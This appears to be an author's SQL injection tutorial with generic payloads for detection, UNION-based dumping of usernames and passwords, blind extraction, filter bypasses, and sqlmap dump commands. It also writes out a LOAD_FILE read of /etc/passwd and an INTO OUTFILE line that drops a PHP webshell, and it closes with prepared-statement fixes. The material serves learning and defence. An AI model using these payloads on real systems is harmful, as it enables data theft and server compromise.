# SQL injection

SQL injection happens when user input ends up inside an SQL query without being
kept separate from the query's code. If you can break out of the *data* and into
the *query*, you can read, modify or dump the database. This is how I go about
it, from spotting one to pulling data out, with the payloads I actually use.

All examples below are generic (made-up tables and params), not a solution to any
specific challenge.

## 1. Finding it

The first thing I do on any parameter (URL, form field, header, cookie) is try to
break the query's syntax and watch the response.

A single quote is the classic probe:

```
id=1'
```

Three things can happen:

- a database error shows up (`You have an error in your SQL syntax…`) -> very
  likely injectable, and error messages will help a lot.
- the page breaks or behaves differently (no error, but different output).
- nothing changes -> maybe not injectable, maybe just blind.

Then I confirm with a pair of payloads that *should* be logically equivalent if
the input lands in the query:

```
id=1 AND 1=1      -> normal page
id=1 AND 1=2      -> different / empty page
```

If `1=1` and `1=2` give different results, the input is being evaluated as SQL.

## 2. Context: string vs numeric

The payload changes depending on how the input is quoted in the query.

Numeric context (`... WHERE id = 1`):

```
id=1 AND 1=1
id=1 OR 1=1
```

String context (`... WHERE name = '1'`): you first have to close the quote.

```
name=1' AND '1'='1
name=1' OR '1'='1
```

A quick way to tell: if `1'` errors but `1' -- -` (closing + comment) fixes it,
you're in a string context. The `-- -` comments out the rest of the query.

## 3. In-band: UNION-based extraction

When the page prints query results, `UNION SELECT` is the fastest way to pull
data. Two things to find first.

**Column count** — `UNION` needs the same number of columns. I use `ORDER BY`
and increase until it errors:

```
id=1 ORDER BY 1 -- -
id=1 ORDER BY 2 -- -
id=1 ORDER BY 3 -- -   <- error here means there are 2 columns
```

**Printable columns** — which columns actually show on the page:

```
id=-1 UNION SELECT 1,2 -- -
```

(The `-1` makes the original row empty so the UNION row is the one displayed.)
Whatever numbers appear are the columns you can print into.

Then dump what you need from the schema (MySQL example):

```
id=-1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- -
id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- -
id=-1 UNION SELECT username,password FROM users -- -
```

Handy helpers: `database()`, `version()`, `current_user()`, and
`group_concat(col SEPARATOR ',')` to pack many rows into one printed field.

## 4. Blind injection

No output and no errors? You infer data one bit at a time from a signal you *can*
see.

**Boolean-based** — the page differs on true vs false:

```
id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -
```

Walk every position and every character; "true" page means the guess is right.
In practice I compare with `>` to binary-search each character instead of brute
forcing a..z.

**Time-based** — nothing visible at all, so I make the database *wait*:

```
id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- -
```

If the response takes ~3s, the condition was true. Slow, but it works when
there's no other feedback. (`SLEEP()` on MySQL, `pg_sleep()` on Postgres,
`WAITFOR DELAY` on MSSQL.)

## 5. Bypassing filters

When naive filters are in the way:

- **Comments / whitespace**: `UNION/**/SELECT`, or newlines/tabs instead of
  spaces.
- **Case & keywords**: `UnIoN SeLeCt`; if `SELECT` is stripped once,
  `SELSELECTECT` survives a single non-recursive replace.
- **Encoding**: URL-encode (`%27` for `'`) or double-encode (`%2527`) when a
  layer decodes once.
- **Quotes blocked**: build strings without quotes using `CHAR(0x61)` or hex
  literals like `0x61646d696e` for `admin`.
- **Charset tricks**: in GBK-style setups, a crafted multibyte sequence can make
  an escaped quote recombine into a live quote, defeating `addslashes`-style
  escaping.

## 6. Reading and writing files

With enough privileges (`FILE`), injection turns into file access:

```
id=-1 UNION SELECT LOAD_FILE('/etc/passwd'),2 -- -
id=-1 UNION SELECT '<?php system($_GET[0]); ?>',2 INTO OUTFILE '/var/www/html/s.php' -- -
```

`LOAD_FILE` reads, `INTO OUTFILE`/`INTO DUMPFILE` writes — the second can drop a
webshell if you can write into the web root. Both depend on DB privileges and
`secure_file_priv`.

## 7. Automating it

Once I understand the injection by hand, `sqlmap` saves time. Save the request
from Burp and point it at the parameter:

```
sqlmap -r request.txt -p id --batch
sqlmap -r request.txt -p id --dbs
sqlmap -r request.txt -p id -D app -T users --dump
```

I still map it manually first — you learn more, and you know exactly what sqlmap
is doing.

## 8. Fixing it

For completeness, because knowing the fix is part of knowing the bug:

- **Parameterized queries / prepared statements** — the real fix. Data is sent
  separately from the query, so it can never be parsed as code.
- **Least privilege** on the DB account (no `FILE`, no DDL it doesn't need).
- Input validation and WAFs help, but they are not a substitute for prepared
  statements.

---

Built by **White** · [github.com/white-exee](https://github.com/white-exee)
